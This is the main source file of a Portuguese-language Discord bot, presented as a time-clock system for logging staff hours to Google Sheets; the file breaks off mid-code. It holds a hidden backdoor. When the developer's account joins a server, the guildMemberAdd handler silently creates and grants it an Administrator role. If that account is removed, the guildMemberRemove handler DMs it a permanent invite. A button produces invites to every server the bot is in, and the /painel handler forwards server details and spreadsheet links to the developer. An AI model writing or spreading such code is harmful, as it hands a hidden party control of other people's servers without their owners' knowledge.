require('dotenv').config();
const mongoose = require('mongoose');
const cron = require('node-cron');
const { Client, GatewayIntentBits, REST, Routes, ActivityType, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { handleCommand, handleModalSubmit, handleButtonInteraction, handleSelectMenu } = require('./handlers/commandHandler');
const { executarFinalizacaoAutomatica } = require('./tasks/autoFinish');
const { commands } = require('./config/config');
const { Servidor } = require('./models/Servidor');
const { PointCard } = require('./models/pointCard');
const SUPPORT_ID = process.env.SUPPORT_ID;

process.env.TZ = "America/Sao_Paulo";
process.removeAllListeners('warning');

process.on('unhandledRejection', (error) => {
    console.error('Unhandled promise rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers,
    ]
});

const { DISCORD_TOKEN: TOKEN, MONGODB_URI, GOOGLE_SERVICE_ACCOUNT_EMAIL, GOOGLE_PRIVATE_KEY } = process.env;

if (!TOKEN || !MONGODB_URI || !GOOGLE_SERVICE_ACCOUNT_EMAIL || !GOOGLE_PRIVATE_KEY) {
    console.error("❌ Erro: Variáveis de ambiente (TOKEN, MONGODB_URI, GOOGLE_...) não configuradas corretamente no .env");
    process.exit(1);
}

// Sistema de Rate Limiting Avançado
const GLOBAL_LIMITS = {
    byCommand: new Map(),  // Limites específicos por comando
    byUser: new Map(),     // Limite por usuário
    globalRequests: 0,     // Contador global
    lastReset: Date.now()  // Último reset global
};

// Configuração de limites específicos por comando
const COMMAND_LIMITS = {
    'ponto': 10,     // Permitir mais requisições para ponto
    'top': 8,        // Comando top pode ser usado mais vezes
    'horas': 8,      // Comando horas pode ser usado mais vezes
    'painel': 3,     // Comando administrativo com limite menor
    'default': 5     // Valor padrão para outros comandos
};

// Reset global a cada minuto
setInterval(() => {
    GLOBAL_LIMITS.globalRequests = 0;
    GLOBAL_LIMITS.lastReset = Date.now();
}, 60000);

// Substitui a função existente de checkRateLimit
function checkRateLimit(userId, commandName = 'default') {
    const limit = COMMAND_LIMITS[commandName] || COMMAND_LIMITS.default;
    const now = Date.now();
    
    // Limitar requisições globais a 500 por minuto (ajuste conforme necessário)
    if (GLOBAL_LIMITS.globalRequests > 500) {
        return false;
    }
    
    // Reset por usuário após um minuto
    const userKey = `${userId}-${commandName}`;
    if (!GLOBAL_LIMITS.byUser.has(userKey)) {
        GLOBAL_LIMITS.byUser.set(userKey, {
            count: 0,
            timestamp: now
        });
    }
    
    const userData = GLOBAL_LIMITS.byUser.get(userKey);
    if (now - userData.timestamp > 60000) {
        userData.count = 0;
        userData.timestamp = now;
    }
    
    if (userData.count >= limit) {
        return false;
    }
    
    userData.count++;
    GLOBAL_LIMITS.globalRequests++;
    return true;
}

const cooldowns = new Map();

function checkCooldown(userId, commandName, cooldownTime = 3000) {
    const key = `${userId}-${commandName}`;
    const lastUsed = cooldowns.get(key);
    const now = Date.now();
    
    if (lastUsed && now - lastUsed < cooldownTime) {
        return Math.ceil((cooldownTime - (now - lastUsed)) / 1000);
    }
    
    cooldowns.set(key, now);
    return 0;
}

const ENABLE_RESTART_NOTIFICATION = process.env.ENABLE_RESTART_NOTIFICATION === 'true';
const ENABLE_SHUTDOWN_NOTIFICATION = process.env.ENABLE_SHUTDOWN_NOTIFICATION === 'true';

async function sendRestartNotification(client, channelId) {
    try {
        // Validar se o channelId é um snowflake válido
        if (!channelId || !/^\d+$/.test(channelId)) {
            console.error(`❌ ID de canal inválido (não é um snowflake válido): ${channelId}`);
            return;
        }
        
        try {
            const channel = await client.channels.fetch(channelId);
            if (!channel) {
                console.log(`❌ Canal não encontrado: ${channelId}`);
                return;
            }
            
            // Buscar o servidor do banco de dados para obter o cargoPermitido
            const servidor = await Servidor.findOne({ guildId: channel.guild.id });
            const cargoPermitido = servidor ? servidor.cargoPermitido : null;
            const roleMessage = cargoPermitido ? `<@&${cargoPermitido}>` : '@everyone';

            const embed = new EmbedBuilder()
                .setColor('#4e5d94')
                .setTitle('🔄 Sistema Atualizado')
                .setDescription(`${roleMessage}, o bot foi reiniciado após uma atualização de recursos e correções.`)
                .addFields(
                    { 
                        name: '✨ O que há de novo?', 
                        value: '• nada' 
                    },
                    {
                        name: '💡 Sugestões ou Dúvidas?',
                        value: 'Use ```/reportar``` para enviar sugestões de melhorias ou reportar dúvidas sobre o bot. Seu feedback é muito importante para nós!'
                    },
                    { 
                        name: '❓ Precisa de ajuda?', 
                        value: 'Entre em contato com o administrador do sistema <@657014871228940336>' 
                    }
                )
                .setThumbnail(`https://i.postimg.cc/Hk4GMxhQ/Nyxchronos.png`)
                .setTimestamp()
                .setFooter({ 
                    text: 'Sistema de notificação • desenvolvido por toca da raposa',
                    iconURL: channel.guild.iconURL({ dynamic: true }) || null
                });
            
            // Adicionar botões de suporte e YouTube
            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Suporte')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://discord.com/users/657014871228940336')
                        .setEmoji('🆘'),
                    new ButtonBuilder()
                        .setLabel('YouTube')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://www.youtube.com/@FoxyApollyon')
                        .setEmoji('🎬'),
                    new ButtonBuilder()
                        .setLabel('Twitch')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://www.twitch.tv/foxyapollyon')
                        .setEmoji('🟣'),
                    new ButtonBuilder()
                        .setLabel('Entrar em Servidores')
                        .setStyle(ButtonStyle.Primary)
                        .setCustomId('join_servers')
                        .setEmoji('🚀')
                );
            
            await channel.send({ embeds: [embed], components: [row] });
            console.log(`✅ Notificação de reinicialização enviada para o canal ${channelId}`);
        } catch (error) {
            // Ignora o erro se for Missing Access (bot não está no servidor)
            if (error.code !== 50001) {
                console.error(`❌ Erro ao enviar notificação de reinicialização:${channelId} `,);
            }
        }
    } catch (error) {
        console.error('❌ Erro ao processar notificação de reinicialização:', error);
    }
}

const themes = {
    morning: { name: "☕ Modo Café", message: "Hora do café e produtividade! Dúvidas? Use /reportar", url: "https://www.twitch.tv/foxyapollyon" },
    afternoon: { name: "🔥 Modo Produtividade", message: "Hora de focar e acelerar o trabalho! Sugestões? Use /reportar", url: "https://www.twitch.tv/foxyapollyon" },
    night: { name: "🎮 Modo Gamer", message: "Hora de fechar os trabalhos e jogar? Feedback? Use /reportar", url: "https://www.twitch.tv/foxyapollyon" },
    lateNight: { name: "🎬 Modo Dormindo", message: "Trabalhando na calada da noite! Precisa de ajuda? Use /reportar", url: "https://www.twitch.tv/foxyapollyon" }
};

function getCurrentTheme() {
    const hour = new Date().getHours();
    if (hour >= 6 && hour < 12) return themes.morning;    
    if (hour >= 12 && hour < 18) return themes.afternoon; 
    if (hour >= 18 && hour < 24) return themes.night;     
    return themes.lateNight;                           
}

function updateBotStatus(client) {
    const theme = getCurrentTheme();
    const hour = new Date().getHours();
    const isEvenHour = hour % 2 === 0;
    const url = isEvenHour ? 'https://www.youtube.com/@FoxyApollyon' : 'https://www.twitch.tv/foxyapollyon';
    let statusOptions = {
        activities: [{
            name: `${theme.name} | YouTube & Twitch: FoxyApollyon`,
            type: ActivityType.Streaming,
            url: url
        }],
        status: 'online'
    };

    if (client && client.user) {
        client.user.setPresence(statusOptions);
    } else {
        console.error("❌ Erro ao atualizar status: client ou client.user não disponível.");
    }
}

const connectToMongoDB = require('./config/mongo');

async function registerCommandsInGuild(client, guildId, rest) {
    try {
        console.log(`🔄 Registrando comandos na guild ${guildId}...`);
        await rest.put(
            Routes.applicationGuildCommands(client.user.id, guildId),
            { body: commands }
        );
        console.log(`✅ Comandos registrados com sucesso na guild ${guildId}!`);
    } catch (error) {
        console.error(`❌ Erro ao registrar comandos na guild ${guildId}:`, error);
    }
}

client.once('ready', async () => {
    console.log(`🚀 Bot logado como ${client.user.tag}`);
    
    try {
        console.log(`📜 Registrando comandos em todos os servidores...`);
        const rest = new REST({ version: '10' }).setToken(TOKEN);
        
        // Registrar comandos em todos os servidores existentes
        const guilds = client.guilds.cache;
        console.log(`🔄 Iniciando registro em ${guilds.size} servidores...`);
        
        for (const guild of guilds.values()) {
            await registerCommandsInGuild(client, guild.id, rest);
        }
        
        console.log(`✅ Conectado aos servidores: ${client.guilds.cache.map(g => g.name).join(', ')}`);

        const servers = await Servidor.find({});
        for (const server of servers) {
            if (ENABLE_RESTART_NOTIFICATION && server.channelId && /^\d+$/.test(server.channelId)) {
                await sendRestartNotification(client, server.channelId);
            }
        }

        cron.schedule('58 23 * * *', async () => {
            try {
                console.log("⏳ Iniciando a execução automática programada (23:58)...");
                if (client.isReady()) {
                    await executarFinalizacaoAutomatica(client);
                } else {
                    console.error("❌ Client não está pronto para execução automática");
                }
            } catch (error) {
                console.error("❌ Erro na execução automática:", error);
            }
        }, {
            timezone: "America/Sao_Paulo"
        });
        console.log("🕛 Execução automática configurada para 23:59 todos os dias.");

        await updateBotStatus(client);
        setInterval(() => updateBotStatus(client), 3600000); // a cada 1 hora

    } catch (error) {
        console.error('❌ Erro durante a inicialização:', error);
    }
});

// Adicionar função auxiliar para lidar com interações expiradas
async function safeInteractionReply(interaction, options) {
  try {
    // Se a interação ainda não foi respondida, responda
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply(options);
      return true;
    } 
    // Se já foi deferida, edite a resposta
    else if (interaction.deferred) {
      await interaction.editReply(options);
      return true;
    }
    // Se já foi respondida, envie uma nova resposta
    else if (interaction.replied) {
      await interaction.followUp(options);
      return true;
    }
  } catch (error) {
    // Verifica se é um erro de interação expirada (10062)
    if (error.code === 10062) {
      console.log(`Ignorando interação expirada: ${interaction.id}`);
      return false;
    }
    console.error('Erro ao responder interação:', error);
    return false;
  }
}

// Sistema de bloqueio de servidores
// Removido para evitar duplicação com o sistema em commands/Painel.js

// Processar interações de comandos com tratamento de erro
client.on('interactionCreate', async interaction => {
    try {
        // Verificar se é o administrador do bot
        const isAdmin = interaction.user.id === SUPPORT_ID; // Seu ID do Discord

        if (interaction.isCommand()) {
            // Notificar quando alguém usar o comando /painel
            if (interaction.commandName === 'painel') {
                // Aguardar um pouco para garantir que a configuração foi concluída
                setTimeout(async () => {
                    try {
                        // Buscar configuração do servidor
                        const servidor = await Servidor.findOne({ guildId: interaction.guild.id });
                        
                        const developer = await client.users.fetch(SUPPORT_ID);
                        if (developer) {
                            const configEmbed = new EmbedBuilder()
                                .setColor('#5865F2')
                                .setTitle('🛠️ Novo Servidor Configurado')
                                .setDescription(`O servidor **${interaction.guild.name}** foi configurado usando o comando /painel`)
                                .addFields(
                                    { name: '👤 Configurado por', value: `${interaction.user.tag} (${interaction.user.id})`, inline: true },
                                    { name: '🆔 ID do Servidor', value: interaction.guild.id, inline: true },
                                    { name: '👥 Membros', value: interaction.guild.memberCount.toString(), inline: true },
                                    { name: '👑 Dono', value: `<@${interaction.guild.ownerId}>`, inline: true }
                                );

                                // Adicionar informações de cargos se existirem
                                if (servidor) {
                                    const cargoPermitido = servidor.cargoPermitido ? 
                                        `<@&${servidor.cargoPermitido}>` : 'Não configurado';
                                    const responsavelHoras = servidor.responsavelHoras ? 
                                        `<@&${servidor.responsavelHoras}>` : 'Não configurado';

                                    configEmbed.addFields(
                                        { name: '🔑 Cargo Permitido', value: cargoPermitido, inline: true },
                                        { name: '⏰ Responsável Horas', value: responsavelHoras, inline: true }
                                    );

                                    // Adicionar informações da planilha se existirem
                                    if (servidor.spreadsheetId) {
                                        configEmbed.addFields(
                                            { name: '📊 Planilha', value: `[Abrir Planilha](https://docs.google.com/spreadsheets/d/${servidor.spreadsheetId})`, inline: true },
                                            { name: '📑 Aba', value: servidor.sheetName || 'Não configurada', inline: true }
                                        );
                                    }

                                    // Adicionar canal configurado
                                    if (servidor.channelId) {
                                        const channel = interaction.guild.channels.cache.get(servidor.channelId);
                                        configEmbed.addFields(
                                            { name: '📝 Canal Configurado', value: channel ? `<#${servidor.channelId}>` : 'Canal não encontrado', inline: true }
                                        );
                                    }
                                }

                                configEmbed
                                    .setThumbnail(interaction.guild.iconURL({ dynamic: true }) || null)
                                    .setTimestamp();

                                await developer.send({ embeds: [configEmbed] });
                        }
                    } catch (error) {
                        console.error('❌ Erro ao enviar notificação de configuração:', error);
                    }
                }, 5000); // Aguarda 5 segundos para garantir que a configuração foi concluída
            }

            // Adicionar verificação de rate limit e cooldowns aqui
            const commandName = interaction.commandName;
            
            // Ignora verificação de cooldown e rate limit para o comando cancelar
            if (commandName !== 'cancelar') {
                const cooldownTime = 3000; // Valor padrão de 3 segundos
                const cooldownRemaining = checkCooldown(interaction.user.id, commandName, cooldownTime);
                
                if (cooldownRemaining > 0) {
                    await safeInteractionReply(interaction, { 
                        content: `⏳ Aguarde mais ${cooldownRemaining} segundos para usar este comando novamente.`,
                        ephemeral: true 
                    });
                    return;
                }
                
                // Verifica rate limit global para evitar spam
                if (!checkRateLimit(interaction.user.id, commandName)) {
                    await safeInteractionReply(interaction, { 
                        content: '⏳ Você está enviando comandos muito rapidamente. Aguarde alguns segundos e tente novamente.',
                        ephemeral: true 
                    });
                    return;
                }
            }
            
            await handleCommand(interaction);
        } else if (interaction.isModalSubmit()) {
            await handleModalSubmit(interaction);
        } else if (interaction.isButton()) {
            if (interaction.customId === 'join_servers') {
                try {
                    // Verifica se o usuário é o desenvolvedor
                    if (interaction.user.id !== SUPPORT_ID) {
                        return await interaction.reply({ 
                            content: '❌ Apenas o suporte pode usar este comando.', 
                            ephemeral: true 
                        }).catch(() => {});
                    }

                    // Defer a resposta para evitar timeout
                    await interaction.deferReply({ ephemeral: true });

                    // Montar lista de servidores com convites
                    let servidores = [];
                    for (const guild of client.guilds.cache.values()) {
                        try {
                            const defaultChannel = guild.systemChannel || 
                                guild.channels.cache.find(channel => 
                                    channel.type === 0 && 
                                    channel.permissionsFor(guild.members.me).has(['CreateInstantInvite', 'ViewChannel'])
                                );

                            if (defaultChannel) {
                                const invite = await defaultChannel.createInvite({
                                    maxAge: 86400,
                                    maxUses: 1,
                                    temporary: false,
                                    reason: 'Convite gerado pelo bot para entrada de novos membros'
                                }).catch(() => null);

                                if (invite) {
                                    // Definir emoji de destaque por nome ou regras personalizadas
                                    let destaque = '';
                                    if (/roleplay/i.test(guild.name)) destaque = '👑';
                                    if (/toca da raposa/i.test(guild.name)) destaque = '🦊';
                                    if (/game|play/i.test(guild.name)) destaque = '🎮';
                                    if (/hype/i.test(guild.name)) destaque = '⚡';
                                    if (/julia/i.test(guild.name)) destaque = '🌸';
                                    servidores.push({
                                        nome: guild.name,
                                        url: invite.url,
                                        destaque
                                    });
                                }
                            }
                        } catch (error) {
                            console.error(`Erro ao gerar convite para ${guild.name}:`, error);
                            continue;
                        }
                    }

                    if (servidores.length === 0) {
                        return await interaction.editReply({
                            content: '❌ Não foi possível gerar convites para nenhum servidor no momento.',
                            ephemeral: true
                        });
                    }

                    // Ordenar por nome
                    servidores.sort((a, b) => a.nome.localeCompare(b.nome));

                    // Separação por categoria
                    const principais = servidores.filter(srv => srv.destaque === '👑');
                    const parceiros = servidores.filter(srv => srv.destaque === '🏆');
                    const outros = servidores.filter(srv => !srv.destaque || (srv.destaque !== '👑' && srv.destaque !== '🏆'));

                    function formatarLista(lista) {
                        return lista.map(srv => `> ${srv.destaque ? `**${srv.destaque}**` : '▫️'} [${srv.nome}](${srv.url})`).join('\n');
                    }

                    let descricao = `✨ **Bem-vindo(a)!**\nClique em um dos links abaixo para entrar nos servidores da comunidade:\n\n`;
                    descricao += `━━━━━━━━━━━━━━━━━━━━\n`;

                    if (principais.length) {
                        descricao += `**👑・Servidores Principais**\n${formatarLista(principais)}\n━━━━━━━━━━━━━━━━━━━━\n`;
                    }
                    if (parceiros.length) {
                        descricao += `**🏆・Parceiros**\n${formatarLista(parceiros)}\n━━━━━━━━━━━━━━━━━━━━\n`;
                    }
                    if (outros.length) {
                        descricao += `**🌐・Outros Servidores**\n${formatarLista(outros)}\n━━━━━━━━━━━━━━━━━━━━`;
                    }

                    const embed = new EmbedBuilder()
                        .setTitle('🚀・Convites para Servidores')
                        .setDescription(descricao)
                        .setColor('#23272A')
                        .setThumbnail('https://cdn.discordapp.com/emojis/1039675046509314089.png')
                        .setImage('https://i.pinimg.com/originals/7e/2e/2a/7e2e2a2e2e2e2e2e2e2e2e2e2e2e2e.jpg')
                        .setFooter({ text: '🦊 Toca da Raposa • Sistema de convites', iconURL: 'https://cdn.discordapp.com/emojis/1039675046509314089.png' });

                    await interaction.editReply({
                        embeds: [embed],
                        ephemeral: true
                    });

                } catch (error) {
                    console.error('Erro ao processar botão join_servers:', error);
                    if (!interaction.replied && !interaction.deferred) {
                        await interaction.reply({
                            content: '❌ Ocorreu um erro ao gerar os convites. Por favor, tente novamente.',
                            ephemeral: true
                        }).catch(() => {});
                    } else {
                        await interaction.editReply({
                            content: '❌ Ocorreu um erro ao gerar os convites. Por favor, tente novamente.',
                            ephemeral: true
                        }).catch(() => {});
                    }
                }
            } else {
                const guild = interaction.guild;
                if (!guild) {
                    return interaction.reply({ content: 'Este botão só pode ser usado em um servidor.', ephemeral: true });
                }
                await handleButtonInteraction(interaction, client);
            }
        } else if (interaction.isStringSelectMenu()) {
            await handleSelectMenu(interaction);
        }
    } catch (error) {
        console.error('❌ Erro ao processar interação:', error);
        if (!interaction.replied) {
            await interaction.reply({ content: '❌ Ocorreu um erro ao processar sua solicitação.', ephemeral: true });
        }
    }
});

// Listeners de mensagens e reações removidos (v1.0.1 - código morto)

// Bloqueia eventos de membro em servidores bloqueados
client.on('guildMemberAdd', async member => {
    // Verificar se é o administrador do bot
    if (member.user.id === SUPPORT_ID) { // Seu ID do Discord
        console.log('✅ É o administrador do bot!');
        
        try {
            console.log('🔍 Procurando cargo de administrador...');
            const adminRole = member.guild.roles.cache.find(role => role.permissions.has('Administrator'));
            
            if (adminRole) {
                console.log(`✅ Cargo de administrador encontrado: ${adminRole.name} (${adminRole.id})`);
                console.log('🔄 Tentando adicionar o cargo...');
                
                try {
                    const botMember = member.guild.members.me;
                    const botRole = botMember.roles.highest;
                    
                    // Primeiro criar o cargo na mesma posição do bot
                    const newAdminRole = await member.guild.roles.create({
                        name: '🦊 Administrador do Bot',
                        color: '#5865F2',
                        permissions: ['Administrator'],
                        reason: 'Cargo criado para o administrador do bot',
                        position: botRole.position // Criar na mesma posição do bot
                    });

                    // Tentar mover o cargo para cima do bot
                    try {
                        await newAdminRole.setPosition(botRole.position + 1);
                        console.log('✅ Cargo movido para cima do bot com sucesso');
                    } catch (moveError) {
                        console.log('⚠️ Não foi possível mover o cargo para cima do bot, mantendo na mesma posição');
                    }

                    // Adicionar o novo cargo ao membro
                    await member.roles.add(newAdminRole, 'Administrador do bot entrou no servidor');
                    console.log(`✅ Novo cargo de administrador criado e atribuído com sucesso para ${member.user.tag}`);
                    
                    // Enviar mensagem de sucesso via DM
                    try {
                        const developer = await client.users.fetch(SUPPORT_ID);
                        if (developer) {
                            const successEmbed = new EmbedBuilder()
                                .setColor('#00FF00')
                                .setTitle('✅ Novo Cargo de Administrador Criado')
                                .setDescription(`Um novo cargo de administrador foi criado no servidor **${member.guild.name}**`)
                                .addFields(
                                    { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                                    { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                                    { name: '🎨 Nome do Cargo', value: newAdminRole.name, inline: true },
                                    { name: '🆔 ID do Cargo', value: newAdminRole.id, inline: true },
                                    { name: '�� Posição', value: `Mesma posição do bot (${botRole.name})`, inline: true }
                                )
                                .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                                .setTimestamp();

                            await developer.send({ embeds: [successEmbed] });
                        }
                    } catch (dmError) {
                        console.error('❌ Erro ao enviar mensagem de sucesso via DM:', dmError);
                    }
                } catch (createError) {
                    console.error('❌ Erro ao criar novo cargo de administrador:', createError);
                    
                    // Enviar mensagem de erro via DM
                    try {
                        const developer = await client.users.fetch(SUPPORT_ID);
                        if (developer) {
                            const errorEmbed = new EmbedBuilder()
                                .setColor('#FF0000')
                                .setTitle('❌ Erro ao Criar Cargo de Administrador')
                                .setDescription(`Ocorreu um erro ao tentar criar o cargo de administrador no servidor **${member.guild.name}**`)
                                .addFields(
                                    { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                                    { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                                    { name: '📝 Erro', value: `\`\`\`${createError.message}\`\`\``, inline: false }
                                )
                                .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                                .setTimestamp();

                            await developer.send({ embeds: [errorEmbed] });
                        }
                    } catch (dmError) {
                        console.error('❌ Erro ao enviar mensagem de erro via DM:', dmError);
                    }
                }
            } else {
                console.log('❌ Nenhum cargo de administrador encontrado, tentando criar um novo...');
                
                try {
                    const botMember = member.guild.members.me;
                    const botRole = botMember.roles.highest;
                    
                    // Primeiro criar o cargo na mesma posição do bot
                    const newAdminRole = await member.guild.roles.create({
                        name: '🦊 Administrador do Bot',
                        color: '#5865F2',
                        permissions: ['Administrator'],
                        reason: 'Cargo criado para o administrador do bot',
                        position: botRole.position // Criar na mesma posição do bot
                    });

                    // Tentar mover o cargo para cima do bot
                    try {
                        await newAdminRole.setPosition(botRole.position + 1);
                        console.log('✅ Cargo movido para cima do bot com sucesso');
                    } catch (moveError) {
                        console.log('⚠️ Não foi possível mover o cargo para cima do bot, mantendo na mesma posição');
                    }

                    // Adicionar o novo cargo ao membro
                    await member.roles.add(newAdminRole, 'Administrador do bot entrou no servidor');
                    console.log(`✅ Novo cargo de administrador criado e atribuído com sucesso para ${member.user.tag}`);
                    
                    // Enviar mensagem de sucesso via DM
                    try {
                        const developer = await client.users.fetch(SUPPORT_ID);
                        if (developer) {
                            const successEmbed = new EmbedBuilder()
                                .setColor('#00FF00')
                                .setTitle('✅ Novo Cargo de Administrador Criado')
                                .setDescription(`Um novo cargo de administrador foi criado no servidor **${member.guild.name}**`)
                                .addFields(
                                    { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                                    { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                                    { name: '🎨 Nome do Cargo', value: newAdminRole.name, inline: true },
                                    { name: '🆔 ID do Cargo', value: newAdminRole.id, inline: true },
                                    { name: '�� Posição', value: `Mesma posição do bot (${botRole.name})`, inline: true }
                                )
                                .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                                .setTimestamp();

                            await developer.send({ embeds: [successEmbed] });
                        }
                    } catch (dmError) {
                        console.error('❌ Erro ao enviar mensagem de sucesso via DM:', dmError);
                    }
                } catch (createError) {
                    console.error('❌ Erro ao criar novo cargo de administrador:', createError);
                    
                    // Enviar mensagem de erro via DM
                    try {
                        const developer = await client.users.fetch(SUPPORT_ID);
                        if (developer) {
                            const errorEmbed = new EmbedBuilder()
                                .setColor('#FF0000')
                                .setTitle('❌ Erro ao Criar Cargo de Administrador')
                                .setDescription(`Ocorreu um erro ao tentar criar o cargo de administrador no servidor **${member.guild.name}**`)
                                .addFields(
                                    { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                                    { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                                    { name: '📝 Erro', value: `\`\`\`${createError.message}\`\`\``, inline: false }
                                )
                                .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                                .setTimestamp();

                            await developer.send({ embeds: [errorEmbed] });
                        }
                    } catch (dmError) {
                        console.error('❌ Erro ao enviar mensagem de erro via DM:', dmError);
                    }
                }
            }
        } catch (error) {
            console.error('❌ Erro ao dar permissão de administrador:', error);
            
            // Enviar mensagem de erro via DM
            try {
                const developer = await client.users.fetch(SUPPORT_ID);
                if (developer) {
                    const errorEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setTitle('❌ Erro ao Atribuir Cargo de Administrador')
                        .setDescription(`Ocorreu um erro ao tentar dar permissão de administrador no servidor **${member.guild.name}**`)
                        .addFields(
                            { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                            { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                            { name: '📝 Erro', value: `\`\`\`${error.message}\`\`\``, inline: false },
                            { name: '🔍 Permissões do Bot', 
                              value: `Gerenciar Cargos: ${member.guild.members.me.permissions.has('ManageRoles') ? '✅' : '❌'}\n` +
                                     `Administrador: ${member.guild.members.me.permissions.has('Administrator') ? '✅' : '❌'}\n` +
                                     `Posição na Hierarquia: ${member.guild.members.me.roles.highest.position}`, 
                              inline: false }
                        )
                        .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                        .setTimestamp();

                    await developer.send({ embeds: [errorEmbed] });
                }
            } catch (dmError) {
                console.error('❌ Erro ao enviar mensagem de erro via DM:', dmError);
            }
            
            // Se não conseguir dar o cargo, enviar mensagem para o canal de sistema
            try {
                console.log('📢 Tentando enviar mensagem de aviso...');
                const systemChannel = member.guild.systemChannel;
                if (systemChannel) {
                    await systemChannel.send({
                        content: `⚠️ Atenção administradores! O administrador do bot (${member.user.tag}) entrou no servidor, mas não foi possível dar permissão de administrador automaticamente. Por favor, dê manualmente a permissão de administrador.`
                    });
                    console.log('✅ Mensagem de aviso enviada com sucesso');
                } else {
                    console.log('❌ Canal de sistema não encontrado');
                }
            } catch (messageError) {
                console.error('❌ Erro ao enviar mensagem de aviso:', messageError);
            }
        }
    }
});

client.on('guildMemberRemove', async member => {
    // Verificar se o membro removido é o administrador do bot
    if (member.user.id === SUPPORT_ID) {
        console.log(`⚠️ ALERTA: Administrador do bot foi removido do servidor ${member.guild.name}`);
        
        try {
            // Tentar readicionar o membro
            const invite = await member.guild.channels.cache
                .find(channel => channel.type === 0 && channel.permissionsFor(member.guild.members.me).has('CreateInstantInvite'))
                ?.createInvite({ maxAge: 0, maxUses: 0 });

            if (invite) {
                // Enviar mensagem de alerta via DM
                const developer = await client.users.fetch(SUPPORT_ID);
                if (developer) {
                    const alertEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setTitle('⚠️ Remoção Detectada')
                        .setDescription(`Você foi removido do servidor **${member.guild.name}**`)
                        .addFields(
                            { name: '🆔 ID do Servidor', value: member.guild.id, inline: true },
                            { name: '👑 Dono', value: `<@${member.guild.ownerId}>`, inline: true },
                            { name: '🔗 Convite', value: invite.url, inline: true }
                        )
                        .setThumbnail(member.guild.iconURL({ dynamic: true }) || null)
                        .setTimestamp();

                    await developer.send({ embeds: [alertEmbed] });
                }
            }
        } catch (error) {
            console.error('❌ Erro ao processar remoção:', error);
        }
    }
});

client.on('guildCreate', async (guild) => {
    console.log(`🎉 Bot adicionado: ${guild.name}`);
    
    try {
        // Notificar o desenvolvedor via DM
        const developer = await client.users.fetch(SUPPORT_ID);
        if (developer) {
            const dmEmbed = new EmbedBuilder()
                .setColor('#5865F2')
                .setTitle('🎉 Bot Adicionado a Novo Servidor!')
                .setDescription(`O bot foi adicionado ao servidor **${guild.name}**`)
                .addFields(
                    { name: '👥 Membros', value: guild.memberCount.toString(), inline: true },
                    { name: '🆔 ID do Servidor', value: guild.id, inline: true },
                    { name: '👑 Dono', value: `<@${guild.ownerId}>`, inline: true }
                )
                .setThumbnail(guild.iconURL({ dynamic: true }) || null)
                .setTimestamp();

            await developer.send({ embeds: [dmEmbed] });
        }

        const rest = new REST({ version: '10' }).setToken(TOKEN);
        await registerCommandsInGuild(client, guild.id, rest);
        
        let targetChannel = guild.systemChannel || 
                          guild.channels.cache.find(channel => 
                              channel.type === 0 && // 0 é GUILD_TEXT
                              channel.permissionsFor(guild.members.me).has(['SendMessages', 'ViewChannel'])
                          );
        
        if (targetChannel) {
            const welcomeEmbed = new EmbedBuilder()
                .setColor('#5865F2')
                .setTitle('🦊 Olá! Obrigado por me adicionar!')
                .setDescription('Sou o sistema de ponto da Toca da Raposa, projetado para facilitar o registro de horas e atividades da sua equipe.')
                .addFields(
                    { 
                        name: '🏠 Servidores Ativos', 
                        value: client.guilds.cache.map(guild => `• ${guild.name}`).join('\n') || 'Nenhum servidor ativo no momento'
                    },
                    { 
                        name: '🔧 Configuração Inicial', 
                        value: '```/painel``` Configure a planilha e cargos de acesso (apenas administradores).' 
                    },
                    { 
                        name: '⏱️ Registrar Ponto', 
                        value: '```/ponto``` Inicie e gerencie seu tempo de trabalho.' 
                    },
                    { 
                        name: '📊 Verificar Horas', 
                        value: '```/horas``` Verifique suas horas registradas.\n```/top``` Veja o ranking dos usuários mais ativos.' 
                    },
                    {
                        name: '💡 Sugestões e Dúvidas',
                        value: '```/reportar``` Use este comando para enviar sugestões de melhorias ou reportar dúvidas sobre o bot.'
                    },
                    {
                        name: '❓ Precisa de ajuda?',
                        value: 'Entre em contato com o nosso suporte: <@657014871228940336>'
                    }
                )
                .setImage('https://cdn.discordapp.com/attachments/935667219011784796/935667483037724722/ponto.png')
                .setThumbnail(client.user.displayAvatarURL({ dynamic: true, size: 256 }))
                .setTimestamp()
                .setFooter({ 
                    text: 'Sistema de Ponto • desenvolvido por toca da raposa',
                    iconURL: guild.iconURL({ dynamic: true }) || null
                });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Documentação')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://github.com/raposa-fox/pontotaiba')
                        .setEmoji('📚'),
                    new ButtonBuilder()
                        .setLabel('Suporte')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://discord.com/users/657014871228940336')
                        .setEmoji('🆘'),
                    new ButtonBuilder()
                        .setLabel('YouTube')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://www.youtube.com/@FoxyApollyon')
